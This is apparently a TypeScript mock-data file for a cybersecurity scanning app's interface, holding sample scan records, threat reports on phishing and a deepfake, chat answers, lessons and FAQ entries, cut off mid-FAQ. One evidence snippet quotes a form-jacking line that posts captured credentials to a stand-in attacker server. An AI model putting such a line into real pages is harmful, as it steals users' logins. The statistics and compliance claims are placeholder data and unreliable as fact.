import type {
  ScanRecord,
  ScanReport,
  NotificationItem,
  ChatConversation,
  ChatMessage,
  AcademyCategory,
  AcademyLesson,
  Badge,
  ActivityItem,
  User,
} from "@/types";

// ============================================
// Current mock user
// ============================================
export const MOCK_USER: User = {
  id: "usr_001",
  name: "Alex Morgan",
  email: "alex.morgan@cybershield.ai",
  avatar: "AM",
  role: "Security Analyst",
  joinedAt: "2025-03-14",
  securityScore: 87,
  plan: "enterprise",
};

// ============================================
// Dashboard statistics
// ============================================
export const DASHBOARD_STATS = {
  totalScans: 1284,
  threatsDetected: 173,
  safeFiles: 1111,
  avgRiskScore: 28,
  weeklyActivity: [
    { day: "Mon", scans: 42, threats: 8 },
    { day: "Tue", scans: 58, threats: 12 },
    { day: "Wed", scans: 71, threats: 15 },
    { day: "Thu", scans: 49, threats: 6 },
    { day: "Fri", scans: 88, threats: 19 },
    { day: "Sat", scans: 35, threats: 4 },
    { day: "Sun", scans: 28, threats: 3 },
  ],
  threatCategories: [
    { name: "Phishing", value: 64, color: "#ef4444" },
    { name: "Malware", value: 38, color: "#a855f7" },
    { name: "Social Eng.", value: 28, color: "#f59e0b" },
    { name: "Ransomware", value: 18, color: "#ec4899" },
    { name: "Deepfake", value: 15, color: "#06b6d4" },
    { name: "Other", value: 10, color: "#64748b" },
  ],
  scannerUsage: [
    { name: "URL", value: 412, color: "#00d4ff" },
    { name: "Email", value: 358, color: "#10b981" },
    { name: "Image", value: 184, color: "#a855f7" },
    { name: "Document", value: 142, color: "#f59e0b" },
    { name: "QR", value: 96, color: "#06b6d4" },
    { name: "Audio", value: 52, color: "#ec4899" },
    { name: "Video", value: 40, color: "#ef4444" },
  ],
};

// ============================================
// Recent scans
// ============================================
export const RECENT_SCANS: ScanRecord[] = [
  {
    id: "scan_001",
    type: "email",
    target: "support@arnazon-secure.com",
    status: "completed",
    threatLevel: "critical",
    riskScore: 94,
    confidence: 98,
    createdAt: "2026-07-29T08:23:00Z",
    category: "Phishing",
    summary: "Brand impersonation targeting Amazon credentials with credential harvesting link.",
  },
  {
    id: "scan_002",
    type: "url",
    target: "https://paypaal-verify.com/login",
    status: "completed",
    threatLevel: "high",
    riskScore: 81,
    confidence: 95,
    createdAt: "2026-07-29T07:42:00Z",
    category: "Phishing",
    summary: "Spoofed PayPal login page with form-jacking script detected.",
  },
  {
    id: "scan_003",
    type: "qr",
    target: "QR Code (menu)",
    status: "completed",
    threatLevel: "medium",
    riskScore: 42,
    confidence: 88,
    createdAt: "2026-07-28T22:11:00Z",
    category: "Suspicious Redirect",
    summary: "QR redirects through 3 hops before reaching a tracking pixel farm.",
  },
  {
    id: "scan_004",
    type: "image",
    target: "invoice_screenshot.png",
    status: "completed",
    threatLevel: "safe",
    riskScore: 6,
    confidence: 92,
    createdAt: "2026-07-28T19:05:00Z",
    category: "Benign",
    summary: "No malicious content detected. OCR extracted legitimate invoice content.",
  },
  {
    id: "scan_005",
    type: "document",
    target: "contract_final.pdf",
    status: "completed",
    threatLevel: "high",
    riskScore: 76,
    confidence: 91,
    createdAt: "2026-07-28T16:38:00Z",
    category: "Malware",
    summary: "Embedded macro attempts to download second-stage payload from C2 server.",
  },
  {
    id: "scan_006",
    type: "audio",
    target: "voicemail_message.mp3",
    status: "completed",
    threatLevel: "medium",
    riskScore: 48,
    confidence: 84,
    createdAt: "2026-07-28T14:12:00Z",
    category: "Vishing",
    summary: "Voice clone indicators detected with urgency-based social engineering pattern.",
  },
  {
    id: "scan_007",
    type: "video",
    target: "ceo_announcement.mp4",
    status: "completed",
    threatLevel: "critical",
    riskScore: 91,
    confidence: 96,
    createdAt: "2026-07-28T11:55:00Z",
    category: "Deepfake",
    summary: "High-confidence deepfake of CEO detected. Lip-sync anomalies and artifacts present.",
  },
  {
    id: "scan_008",
    type: "email",
    target: "hr@company-team.net",
    status: "completed",
    threatLevel: "high",
    riskScore: 79,
    confidence: 93,
    createdAt: "2026-07-28T09:20:00Z",
    category: "Business Email Compromise",
    summary: "BEC attempt impersonating HR requesting W-2 information update.",
  },
];

// ============================================
// Sample reports (full detail)
// ============================================
export const SAMPLE_REPORTS: ScanReport[] = [
  {
    id: "rpt_001",
    scanId: "scan_001",
    type: "email",
    target: "support@arnazon-secure.com",
    threatLevel: "critical",
    riskScore: 94,
    confidence: 98,
    category: "Phishing",
    createdAt: "2026-07-29T08:23:00Z",
    executiveSummary:
      "This email is a high-confidence phishing attempt impersonating Amazon's customer support. The sender domain 'arnazon-secure.com' uses a homoglyph attack (replacing 'm' with 'rn') to deceive recipients. The email contains a credential harvesting link disguised as a 'verify account' button, which redirects to a spoofed login page hosted on a compromised WordPress site. The message creates false urgency by claiming the account will be suspended within 24 hours. Multiple threat intelligence feeds have flagged the destination domain as malicious.",
    indicators: [
      { label: "Sender Domain", value: "arnazon-secure.com (homoglyph)", severity: "critical" },
      { label: "SPF/DKIM", value: "Failed", severity: "high" },
      { label: "Hidden Redirect", value: "3-hop redirect chain", severity: "high" },
      { label: "Urgency Cues", value: "Account suspension threat", severity: "medium" },
      { label: "Brand Impersonation", value: "Amazon logo & styling cloned", severity: "high" },
      { label: "Link Domain Age", value: "Registered 4 days ago", severity: "critical" },
    ],
    evidence: [
      {
        title: "Homoglyph Domain",
        description: "Sender domain uses 'rn' to mimic 'm' — a classic homoglyph attack.",
        snippet: "From: Amazon Support <support@arnazon-secure.com>",
        severity: "critical",
      },
      {
        title: "Credential Harvesting Link",
        description: "The 'Verify Account' button links to a URL that resolves to a spoofed Amazon login page.",
        snippet: "https://arnazon-secure.com/verify?token=8f2a9c...",
        severity: "critical",
      },
      {
        title: "Urgency Manipulation",
        description: "Email claims account will be suspended in 24 hours to bypass rational scrutiny.",
        snippet: "Your account will be permanently suspended within 24 hours if not verified.",
        severity: "medium",
      },
    ],
    recommendations: [
      "Do not click any links in this email or enter credentials on the linked page.",
      "Report this email to your security team and forward to report-phishing@amazon.com.",
      "If credentials were entered, immediately reset your Amazon password and enable 2FA.",
      "Block the sender domain and destination URL at your email gateway.",
      "Run a credential exposure check for affected accounts using HaveIBeenPwned.",
    ],
    preventionTips: [
      "Always hover over links to inspect the destination URL before clicking.",
      "Enable hardware-key 2FA (FIDO2) on all critical accounts.",
      "Train staff on homoglyph and lookalike domain recognition.",
      "Deploy DMARC enforcement (p=reject) on your organization's domain.",
      "Use a password manager — it will refuse to autofill on lookalike domains.",
    ],
    tags: ["phishing", "homoglyph", "credential-harvesting", "brand-impersonation"],
  },
  {
    id: "rpt_002",
    scanId: "scan_002",
    type: "url",
    target: "https://paypaal-verify.com/login",
    threatLevel: "high",
    riskScore: 81,
    confidence: 95,
    category: "Phishing",
    createdAt: "2026-07-29T07:42:00Z",
    executiveSummary:
      "The URL 'paypaal-verify.com' is a confirmed phishing page impersonating PayPal. The domain was registered 6 days ago through a privacy-protected registrar. The page clones PayPal's login UI and includes a form-jacking script that exfiltrates entered credentials to an attacker-controlled server. The SSL certificate is valid (Let's Encrypt) but the certificate was issued only 5 days ago, consistent with malicious infrastructure rotation. Threat intelligence indicates this domain is part of a larger phishing kit campaign tracked as 'PPLKit v3'.",
    indicators: [
      { label: "Domain Age", value: "6 days", severity: "critical" },
      { label: "Typosquat", value: "Double 'a' in paypaal", severity: "high" },
      { label: "Form-Jacking", value: "Credential exfil script detected", severity: "critical" },
      { label: "SSL Issuer", value: "Let's Encrypt (5 days old)", severity: "medium" },
      { label: "Hosting", value: "Compromised shared host", severity: "high" },
      { label: "Phishing Kit", value: "PPLKit v3 signature match", severity: "critical" },
    ],
    evidence: [
      {
        title: "Typosquatted Domain",
        description: "Domain 'paypaal-verify.com' uses double 'a' to mimic 'paypal.com'.",
        snippet: "WHOIS: Registered 2026-07-23 via PrivacyGuard",
        severity: "critical",
      },
      {
        title: "Form-Jacking Script",
        description: "JavaScript intercepts form submit and posts credentials to attacker server.",
        snippet: "fetch('https://c2-paypaal.at/capture', {method:'POST', body:creds})",
        severity: "critical",
      },
      {
        title: "UI Clone",
        description: "CSS and asset URLs scraped directly from paypal.com — same sprite sheet hash.",
        snippet: "background-image: url('/webstatic/ic/favicon-32.png')",
        severity: "high",
      },
    ],
    recommendations: [
      "Block this URL at your firewall, DNS resolver, and Secure Web Gateway immediately.",
      "Add the domain and IP to your threat intelligence feed blocklist.",
      "Notify PayPal's anti-phishing team (spoof@paypal.com).",
      "If any user entered credentials, force a password reset and review account activity.",
    ],
    preventionTips: [
      "Bookmark legitimate financial sites — never click links from emails or messages.",
      "Train users to verify the URL bar matches the exact brand domain before login.",
      "Use DNS filtering (e.g. Quad9, Cisco Umbrella) to block known phishing infrastructure.",
      "Deploy browser extensions that flag newly-registered domains.",
    ],
    tags: ["phishing", "typosquat", "form-jacking", "paypal-impersonation"],
  },
  {
    id: "rpt_003",
    scanId: "scan_007",
    type: "video",
    target: "ceo_announcement.mp4",
    threatLevel: "critical",
    riskScore: 91,
    confidence: 96,
    category: "Deepfake",
    createdAt: "2026-07-28T11:55:00Z",
    executiveSummary:
      "This video is a sophisticated deepfake of the company CEO. Multimodal analysis detected lip-sync desynchronization (~120ms drift), unnatural eye blink frequency (3 blinks/min vs human avg 15-20), and GAN-fingerprint artifacts in the frequency domain. The audio track shows synthetic speech patterns consistent with ElevenLabs-style voice cloning. The video was likely generated to authorize a fraudulent wire transfer (a 'CEO fraud' deepfake attack). Immediate verification through a secondary channel is strongly advised before acting on any instructions contained in this video.",
    indicators: [
      { label: "Lip-Sync Drift", value: "120ms (human avg <40ms)", severity: "critical" },
      { label: "Blink Frequency", value: "3/min (suspiciously low)", severity: "high" },
      { label: "GAN Fingerprint", value: "Detected — StyleGAN3 family", severity: "critical" },
      { label: "Voice Clone", value: "Synthetic — cloned voice model", severity: "critical" },
      { label: "Audio-Video Mismatch", value: "Micro-expression inconsistency", severity: "high" },
      { label: "Metadata", value: "Edited in Adobe Premiere 2024", severity: "medium" },
    ],
    evidence: [
      {
        title: "Lip-Sync Analysis",
        description: "Phoneme-to-viseme mapping shows 120ms average drift, far exceeding human tolerance.",
        snippet: "DTW alignment score: 0.62 (threshold 0.85 for authentic)",
        severity: "critical",
      },
      {
        title: "Frequency-Domain Artifacts",
        description: "DCT analysis reveals grid-like artifacts characteristic of GAN-generated content.",
        snippet: "Artifact energy concentrated at 0.25-0.5 cycles/pixel",
        severity: "critical",
      },
      {
        title: "Synthetic Voiceprint",
        description: "Voice biometrics match a synthetic voice profile with 96.4% confidence.",
        snippet: "MFCC variance pattern: synthetic (p < 0.001)",
        severity: "critical",
      },
    ],
    recommendations: [
      "Do NOT act on any instructions in this video without out-of-band verification.",
      "Contact the CEO directly via a known phone number to confirm authorization.",
      "Freeze any pending wire transfers referenced in the video.",
      "Preserve the video as evidence — do not delete or forward.",
      "Escalate to your incident response team immediately.",
      "Issue an organization-wide alert about deepfake CEO fraud attempts.",
    ],
    preventionTips: [
      "Establish a 'verify via known channel' protocol for any video-based authorization.",
      "Train finance and executive staff on deepfake social engineering tactics.",
      "Implement code-word verification for high-value transactions.",
      "Deploy deepfake detection on inbound executive communications.",
      "Limit public video/audio of executives to reduce cloning training data.",
    ],
    tags: ["deepfake", "ceo-fraud", "voice-clone", "wire-fraud", "gan"],
  },
];

// ============================================
// Notifications
// ============================================
export const NOTIFICATIONS: NotificationItem[] = [
  {
    id: "ntf_001",
    type: "threat",
    title: "Critical Threat Detected",
    message: "Phishing email impersonating Amazon blocked from your inbox.",
    timestamp: "2026-07-29T08:23:00Z",
    read: false,
    severity: "critical",
  },
  {
    id: "ntf_002",
    type: "scan",
    title: "Scan Completed",
    message: "URL scan for paypaal-verify.com finished — high risk score.",
    timestamp: "2026-07-29T07:42:00Z",
    read: false,
    severity: "high",
  },
  {
    id: "ntf_003",
    type: "update",
    title: "Security Update Available",
    message: "Threat intelligence database updated with 12,847 new indicators.",
    timestamp: "2026-07-29T06:00:00Z",
    read: false,
    severity: "info",
  },
  {
    id: "ntf_004",
    type: "learning",
    title: "Learning Reminder",
    message: "You're 2 lessons away from completing the Phishing Defense track.",
    timestamp: "2026-07-28T20:15:00Z",
    read: true,
    severity: "low",
  },
  {
    id: "ntf_005",
    type: "system",
    title: "System Maintenance",
    message: "Scheduled maintenance window: Sunday 02:00-04:00 UTC.",
    timestamp: "2026-07-28T14:00:00Z",
    read: true,
    severity: "info",
  },
  {
    id: "ntf_006",
    type: "threat",
    title: "Deepfake Detected",
    message: "Video scan flagged CEO impersonation attempt — review immediately.",
    timestamp: "2026-07-28T11:55:00Z",
    read: true,
    severity: "critical",
  },
  {
    id: "ntf_007",
    type: "scan",
    title: "Batch Scan Completed",
    message: "12 documents scanned. 3 flagged for review.",
    timestamp: "2026-07-28T09:20:00Z",
    read: true,
    severity: "medium",
  },
];

// ============================================
// AI Chat — conversations & messages
// ============================================
export const CHAT_CONVERSATIONS: ChatConversation[] = [
  {
    id: "cnv_001",
    title: "Phishing email analysis",
    lastMessage: "Based on the indicators, this is a high-confidence phishing attempt...",
    updatedAt: "2026-07-29T08:30:00Z",
    unread: false,
  },
  {
    id: "cnv_002",
    title: "Deepfake detection tips",
    lastMessage: "Here are 5 signs to spot a deepfake video...",
    updatedAt: "2026-07-28T15:42:00Z",
    unread: true,
  },
  {
    id: "cnv_003",
    title: "QR code safety best practices",
    lastMessage: "Always check the URL preview before opening a QR destination...",
    updatedAt: "2026-07-27T11:15:00Z",
  },
  {
    id: "cnv_004",
    title: "Ransomware prevention",
    lastMessage: "The 3-2-1 backup strategy is your best defense...",
    updatedAt: "2026-07-26T19:20:00Z",
  },
  {
    id: "cnv_005",
    title: "Password manager comparison",
    lastMessage: "Bitwarden, 1Password, and KeePassXC all offer strong security...",
    updatedAt: "2026-07-25T14:05:00Z",
  },
];

export const SUGGESTED_QUESTIONS = [
  "How can I identify a phishing email?",
  "What are the signs of a deepfake video?",
  "How do I secure my home Wi-Fi network?",
  "What should I do after a data breach?",
  "Explain the difference between phishing and spear phishing",
  "How does ransomware spread and how can I stop it?",
];

export const MOCK_CHAT_RESPONSES: Record<string, string> = {
  default: "I've analyzed your question using CyberShield's threat intelligence database. Based on current threat landscapes and best practices, here's my assessment: The most effective defense combines technical controls (multi-factor authentication, email filtering, endpoint protection) with human awareness training. Organizations that implement layered defenses see up to 70% fewer successful attacks. Would you like me to elaborate on any specific aspect, or shall I generate a detailed remediation checklist?",
  phishing: "Phishing emails typically exhibit several telltale signs:\n\n1. **Urgency cues** — 'Account suspended in 24 hours' creates artificial pressure to bypass critical thinking.\n2. **Sender domain mismatches** — Look for homoglyphs (arnazon vs amazon) and lookalike TLDs (.co vs .com).\n3. **Generic greetings** — 'Dear Customer' instead of your name suggests mass-mailing.\n4. **Suspicious links** — Hover to preview; check for IP addresses, URL shorteners, or recently-registered domains.\n5. **Mismatched 'From' and 'Reply-To'** — Common in spoofed sender attacks.\n\nWhen in doubt, navigate directly to the service in your browser rather than clicking the email link. Would you like me to scan a specific email?",
  deepfake: "Spotting deepfakes requires multimodal analysis. Key indicators include:\n\n**Visual cues:**\n- Lip-sync drift (>40ms is suspicious; humans sync within 20ms)\n- Unnatural blink frequency (avg human: 15-20/min; deepfakes: 3-8/min)\n- Inconsistent lighting or shadows on the face vs. environment\n- Blurring around the eyes, mouth, or hairline\n\n**Audio cues:**\n- Robotic cadence or flat emotional range\n- Missing breath sounds\n- Inconsistent room tone\n\n**Behavioral cues:**\n- Requests that bypass normal verification procedures\n- Urgency around financial transactions\n\nFor high-stakes videos (CEO announcements, financial requests), always verify via an out-of-band channel. Want me to scan a specific video?",
  password: "Strong password hygiene rests on three pillars:\n\n**1. Length over complexity** — A 16-character passphrase like 'correct-horse-battery-staple' is stronger than 'P@ssw0rd1!' and easier to remember.\n\n**2. Unique per service** — Never reuse passwords. A breach in one service shouldn't compromise others. A password manager (Bitwarden, 1Password, KeePassXC) makes this practical.\n\n**3. Multi-factor authentication** — Add a second factor everywhere. Prefer hardware keys (YubiKey) > authenticator apps (Authy, Aegis) > SMS.\n\n**Bonus:** Check your emails at HaveIBeenPwned.com and rotate any exposed passwords immediately.\n\nWould you like a recommendation for a password manager?",
};

export function getMockChatResponse(userInput: string): string {
  const lower = userInput.toLowerCase();
  if (lower.includes("phish")) return MOCK_CHAT_RESPONSES.phishing;
  if (lower.includes("deepfake") || lower.includes("video")) return MOCK_CHAT_RESPONSES.deepfake;
  if (lower.includes("password") || lower.includes("auth")) return MOCK_CHAT_RESPONSES.password;
  return MOCK_CHAT_RESPONSES.default;
}

// ============================================
// Cyber Academy
// ============================================
export const ACADEMY_CATEGORIES: AcademyCategory[] = [
  {
    id: "cat_001",
    slug: "phishing",
    title: "Phishing Defense",
    description: "Recognize, resist, and report phishing attempts across email, SMS, and voice channels.",
    icon: "Fish",
    color: "#ef4444",
    lessonsCount: 12,
    completedLessons: 8,
    difficulty: "beginner",
  },
  {
    id: "cat_002",
    slug: "malware",
    title: "Malware Awareness",
    description: "Understand malware types, infection vectors, and modern defense strategies.",
    icon: "Bug",
    color: "#a855f7",
    lessonsCount: 14,
    completedLessons: 5,
    difficulty: "intermediate",
  },
  {
    id: "cat_003",
    slug: "social-engineering",
    title: "Social Engineering",
    description: "Defend against psychological manipulation tactics used by attackers.",
    icon: "Users",
    color: "#f59e0b",
    lessonsCount: 10,
    completedLessons: 3,
    difficulty: "beginner",
  },
  {
    id: "cat_004",
    slug: "ransomware",
    title: "Ransomware Resilience",
    description: "Build organizational resilience against ransomware through prevention and recovery.",
    icon: "Lock",
    color: "#ec4899",
    lessonsCount: 9,
    completedLessons: 0,
    difficulty: "advanced",
  },
  {
    id: "cat_005",
    slug: "password-security",
    title: "Password Security",
    description: "Master password hygiene, multi-factor authentication, and credential management.",
    icon: "KeyRound",
    color: "#10b981",
    lessonsCount: 8,
    completedLessons: 8,
    difficulty: "beginner",
  },
  {
    id: "cat_006",
    slug: "deepfake-detection",
    title: "Deepfake Detection",
    description: "Identify AI-generated media and protect against synthetic identity attacks.",
    icon: "Clapperboard",
    color: "#06b6d4",
    lessonsCount: 11,
    completedLessons: 2,
    difficulty: "advanced",
  },
  {
    id: "cat_007",
    slug: "qr-code-safety",
    title: "QR Code Safety",
    description: "Understand QR-based attacks and how to safely scan codes in the wild.",
    icon: "QrCode",
    color: "#00d4ff",
    lessonsCount: 6,
    completedLessons: 4,
    difficulty: "beginner",
  },
  {
    id: "cat_008",
    slug: "email-security",
    title: "Email Security",
    description: "Deep dive into SPF, DKIM, DMARC, and modern email threat protection.",
    icon: "Mail",
    color: "#8b5cf6",
    lessonsCount: 13,
    completedLessons: 6,
    difficulty: "intermediate",
  },
];

export const ACADEMY_LESSONS: AcademyLesson[] = [
  {
    id: "les_001",
    categoryId: "cat_001",
    title: "Anatomy of a Phishing Email",
    description: "Break down the structure of a phishing email — sender, headers, body, links, and payloads.",
    duration: "12 min",
    difficulty: "beginner",
    completed: true,
    progress: 100,
    points: 50,
    modules: [
      { title: "Introduction to phishing", duration: "2 min", type: "video" },
      { title: "Sender spoofing techniques", duration: "4 min", type: "reading" },
      { title: "Body content red flags", duration: "3 min", type: "reading" },
      { title: "Quiz: Spot the phish", duration: "3 min", type: "quiz" },
    ],
  },
  {
    id: "les_002",
    categoryId: "cat_001",
    title: "Homoglyph & Lookalike Domains",
    description: "How attackers use Unicode lookalikes to spoof legitimate domains.",
    duration: "15 min",
    difficulty: "intermediate",
    completed: true,
    progress: 100,
    points: 75,
    modules: [
      { title: "What are homoglyphs?", duration: "3 min", type: "video" },
      { title: "Punycode attacks", duration: "5 min", type: "reading" },
      { title: "Detection tools", duration: "5 min", type: "reading" },
      { title: "Quiz: Homoglyph hunting", duration: "2 min", type: "quiz" },
    ],
  },
  {
    id: "les_003",
    categoryId: "cat_001",
    title: "Spear Phishing & BEC",
    description: "Targeted phishing attacks against executives and finance teams.",
    duration: "18 min",
    difficulty: "advanced",
    completed: false,
    progress: 60,
    points: 100,
    modules: [
      { title: "Spear phishing overview", duration: "4 min", type: "video" },
      { title: "Business Email Compromise patterns", duration: "6 min", type: "reading" },
      { title: "Case study: Ubiquiti $46M fraud", duration: "5 min", type: "reading" },
      { title: "Final assessment", duration: "3 min", type: "quiz" },
    ],
  },
  {
    id: "les_004",
    categoryId: "cat_001",
    title: "Vishing & Smishing",
    description: "Voice and SMS phishing — recognizing and resisting multi-channel attacks.",
    duration: "14 min",
    difficulty: "intermediate",
    completed: false,
    progress: 0,
    points: 75,
    modules: [
      { title: "Vishing tactics", duration: "4 min", type: "video" },
      { title: "Smishing payloads", duration: "5 min", type: "reading" },
      { title: "Quiz", duration: "5 min", type: "quiz" },
    ],
  },
];

// ============================================
// User badges & achievements
// ============================================
export const USER_BADGES: Badge[] = [
  {
    id: "bdg_001",
    name: "First Blood",
    description: "Detected your first phishing attempt",
    icon: "Swords",
    earnedAt: "2025-03-15",
    color: "#ef4444",
  },
  {
    id: "bdg_002",
    name: "Eagle Eye",
    description: "Identified 50 threats across all scanner types",
    icon: "Eye",
    earnedAt: "2025-04-22",
    color: "#00d4ff",
  },
  {
    id: "bdg_003",
    name: "Scholar",
    description: "Completed 10 Cyber Academy lessons",
    icon: "GraduationCap",
    earnedAt: "2025-05-10",
    color: "#a855f7",
  },
  {
    id: "bdg_004",
    name: "Streak Keeper",
    description: "30-day daily scan streak",
    icon: "Flame",
    earnedAt: "2025-06-18",
    color: "#f59e0b",
  },
  {
    id: "bdg_005",
    name: "Deepfake Hunter",
    description: "Detected 5 deepfake media files",
    icon: "Clapperboard",
    earnedAt: "2025-07-02",
    color: "#06b6d4",
  },
  {
    id: "bdg_006",
    name: "Sentinel",
    description: "Reached a 90+ security score",
    icon: "Shield",
    earnedAt: "2025-07-19",
    color: "#10b981",
  },
];

export const USER_ACTIVITY: ActivityItem[] = [
  {
    id: "act_001",
    type: "scan",
    title: "Email scan completed",
    description: "support@arnazon-secure.com — Critical threat detected",
    timestamp: "2026-07-29T08:23:00Z",
    icon: "Mail",
  },
  {
    id: "act_002",
    type: "achievement",
    title: "Badge earned: Sentinel",
    description: "Reached a 90+ security score",
    timestamp: "2026-07-19T11:00:00Z",
    icon: "Award",
  },
  {
    id: "act_003",
    type: "learning",
    title: "Lesson completed",
    description: "Homoglyph & Lookalike Domains — Phishing Defense track",
    timestamp: "2026-07-18T19:42:00Z",
    icon: "GraduationCap",
  },
  {
    id: "act_004",
    type: "report",
    title: "Report downloaded",
    description: "Deepfake analysis report — ceo_announcement.mp4",
    timestamp: "2026-07-18T14:15:00Z",
    icon: "Download",
  },
  {
    id: "act_005",
    type: "scan",
    title: "Batch scan completed",
    description: "12 documents scanned — 3 flagged",
    timestamp: "2026-07-17T10:30:00Z",
    icon: "Files",
  },
];

// ============================================
// Security tips
// ============================================
export const SECURITY_TIPS = [
  {
    title: "Enable Hardware 2FA",
    body: "FIDO2 security keys (YubiKey, Titan) provide the strongest protection against phishing. Unlike SMS or app-based OTP, they cryptographically verify the domain, making phishing impossible.",
    icon: "KeyRound",
    color: "#10b981",
  },
  {
    title: "Verify Out-of-Band",
    body: "For any unusual financial request — even from a known executive — verify via a separate channel (phone call to a known number). This defeats email and deepfake-based CEO fraud.",
    icon: "PhoneCall",
    color: "#00d4ff",
  },
  {
    title: "Hover Before You Click",
    body: "Always hover over links to preview the destination URL. Look for typosquats, IP addresses, and recently-registered domains. When in doubt, navigate manually.",
    icon: "MousePointer2",
    color: "#a855f7",
  },
  {
    title: "3-2-1 Backup Rule",
    body: "Maintain 3 copies of critical data, on 2 different media types, with 1 stored off-site. This is your last line of defense against ransomware.",
    icon: "DatabaseBackup",
    color: "#f59e0b",
  },
];

// ============================================
// Scanner page metadata
// ============================================
export const SCANNER_META = {
  ai: {
    title: "AI Scanner",
    subtitle: "Universal multimodal threat analysis powered by Gemma AI",
    icon: "Sparkles",
    accent: "#a855f7",
    accept: "Any file, URL, or text input",
    formats: ["URL", "Email", "Image", "PDF", "Audio", "Video", "QR"],
  },
  url: {
    title: "URL Scanner",
    subtitle: "Analyze any URL for phishing, malware, and reputation",
    icon: "Link2",
    accent: "#00d4ff",
    accept: "Paste a URL or upload a QR code containing a URL",
    formats: ["HTTP", "HTTPS", "QR Image"],
  },
  email: {
    title: "Email Scanner",
    subtitle: "Detect phishing, BEC, and malicious attachments in emails",
    icon: "Mail",
    accent: "#10b981",
    accept: "Paste raw email content or upload .eml / .msg files",
    formats: [".eml", ".msg", "Raw text", "Screenshot"],
  },
  image: {
    title: "Image Scanner",
    subtitle: "OCR, deepfake detection, and visual threat analysis",
    icon: "Image",
    accent: "#a855f7",
    accept: "Drag & drop or browse — screenshots, photos, diagrams",
    formats: ["PNG", "JPG", "WEBP", "GIF", "BMP"],
  },
  document: {
    title: "Document Scanner",
    subtitle: "Detect macro malware, embedded payloads, and social engineering",
    icon: "FileText",
    accent: "#f59e0b",
    accept: "Upload documents for structural and content analysis",
    formats: ["PDF", "DOCX", "XLSX", "PPTX", "RTF"],
  },
  audio: {
    title: "Audio Scanner",
    subtitle: "Voice clone detection and vishing analysis",
    icon: "AudioLines",
    accent: "#ec4899",
    accept: "Upload audio files or record directly from your microphone",
    formats: ["MP3", "WAV", "M4A", "OGG", "FLAC"],
  },
  video: {
    title: "Video Scanner",
    subtitle: "Deepfake detection and manipulated media analysis",
    icon: "Video",
    accent: "#ef4444",
    accept: "Upload video files for frame-by-frame deepfake analysis",
    formats: ["MP4", "MOV", "AVI", "WEBM", "MKV"],
  },
  qr: {
    title: "QR Scanner",
    subtitle: "Analyze QR codes for malicious redirects and payloads",
    icon: "QrCode",
    accent: "#06b6d4",
    accept: "Upload a QR image or scan live using your camera",
    formats: ["PNG", "JPG", "Live Camera"],
  },
} as const;

export type ScannerMetaKey = keyof typeof SCANNER_META;

// ============================================
// Processing steps (used by Processing screen)
// ============================================
export const PROCESSING_STEPS = [
  { label: "Uploading...", icon: "Upload" },
  { label: "Extracting Data...", icon: "Unpack" },
  { label: "Running OCR...", icon: "ScanText" },
  { label: "Analyzing Images...", icon: "Image" },
  { label: "Analyzing Audio...", icon: "AudioLines" },
  { label: "Checking Threat Intelligence...", icon: "Database" },
  { label: "Consulting AI...", icon: "Sparkles" },
  { label: "Generating Report...", icon: "FileText" },
  { label: "Completed.", icon: "CheckCircle2" },
];

// ============================================
// FAQ content
// ============================================
export const FAQ_ITEMS = [
  {
    category: "General",
    questions: [
      {
        q: "What is CyberShield AI?",
        a: "CyberShield AI is a multimodal cybersecurity platform that uses AI to analyze emails, URLs, images, documents, audio, video, and QR codes for threats. Think of it as your AI Security Analyst for every digital threat — See It. Hear It. Verify It.",
      },
      {
        q: "How does CyberShield AI detect threats?",
        a: "We combine three layers: (1) Static analysis — patterns, signatures, metadata, and structural anomalies. (2) Dynamic analysis — sandboxed execution and behavioral observation. (3) AI reasoning — our Gemma-powered model interprets the combined signals the way a human analyst would, producing an executive summary and recommendations.",
      },
      {
        q: "Is my data stored or shared?",
        a: "By default, scanned content is processed in-memory and discarded after analysis unless you explicitly save a report. Saved reports are encrypted at rest with AES-256. We never share your data with third parties. See our Privacy Policy for full details.",
      },
      {
        q: "Do you support team/enterprise use?",
        a: "Yes. The Enterprise plan adds shared workspaces, SSO/SAML, role-based access, audit logs, API access, and a dedicated threat-intel feed. Contact our sales team for a tailored demo.",
      },
    ],
  },
  {
    category: "Scanners",
    questions: [
      {
        q: "What file types can I scan?",
        a: "URLs (HTTP/HTTPS), emails (.eml/.msg/raw text), images (PNG/JPG/WEBP/GIF/BMP), documents (PDF/DOCX/XLSX/PPTX/RTF), audio (MP3/WAV/M4A/OGG/FLAC), video (MP4/MOV/AVI/WEBM/MKV), and QR code images. The AI Scanner accepts any of the above.",
      },
      {
        q: "How accurate is the deepfake detection?",
        a: "Our deepfake detection achieves 96%+ confidence on StyleGAN-family content and 89%+ on diffusion-model content. We analyze lip-sync drift, blink frequency, GAN fingerprints, and audio-video alignment. No detector is perfect — always verify high-stakes videos out-of-band.",
      },
      {
        q: "Can I scan multiple files at once?",
        a: "Pro and Enterprise plans support batch scanning. Drag in up to 50 files at once; each is processed in parallel and aggregated into a single report. Free plan users can scan one file at a time.",
      },
      {
        q: "How long does a scan take?",
        a: "URL scans complete in 5-15 seconds. Email and image scans in 10-30 seconds. Audio and video scans vary by length — a 1-minute clip takes ~30 seconds; a 1-hour video takes ~5 minutes. You'll see live progress on the processing screen.",
      },
    ],
  },
  {
    category: "Account & Billing",
    questions: [
      {
        q: "Is there a free plan?",
        a: "Yes — the Free plan includes 25 scans per month across all scanner types, access to Cyber Academy beginner tracks, and 7-day report retention. Upgrade anytime to Pro for unlimited scans and 1-year retention.",
      },
      {
        q: "How do I cancel my subscription?",
        a: "Go to Settings → Account → Subscription and click 'Cancel plan'. You'll keep access until the end of your billing period. Your data remains available for export for 30 days after cancellation.",
      },
      {
        q: "Do you offer refunds?",
        a: "We offer a 14-day money-back guarantee on all paid plans. If you're not satisfied within 14 days of your purchase, contact support for a full refund — no questions asked.",
      },
      {
        q: "Can I switch plans mid-cycle?",
        a: "Yes. Upgrades take effect immediately and you're prorated for the remainder of the billing period. Downgrades take effect at the next renewal. Manage your plan in Settings → Account.",
      },
    ],
  },
  {
    category: "Privacy & Security",
    questions: [
      {
        q: "Is CyberShield AI SOC 2 compliant?",
        a: "Yes. We are SOC 2 Type II certified and GDPR/CCPA compliant. Our infrastructure runs on ISO 27001-certified data centers. Penetration tests are conducted quarterly by independent third parties.",
      },
      {
        q: "Do you train AI on my data?",
        a: "No. We never use customer-submitted content to train our models. Your data is used solely to produce your analysis report. Aggregate, fully-anonymized threat statistics (e.g. 'phishing up 12% this month') may be published, but never in a way that identifies you or your content.",
      },
      {
        q: "How can I delete my data?",
